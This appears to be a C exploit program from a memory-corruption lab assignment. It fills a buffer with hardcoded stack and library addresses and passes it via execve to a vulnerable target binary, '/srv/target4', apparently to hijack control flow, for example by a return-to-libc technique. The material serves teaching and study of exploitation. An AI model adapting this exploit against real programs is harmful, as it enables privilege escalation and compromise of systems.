#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[24];

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  *addr_ptr++ = 0xffffe420;
  *addr_ptr++ = 0xffffcff0;
  *addr_ptr++ = 0xffffcfe8;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}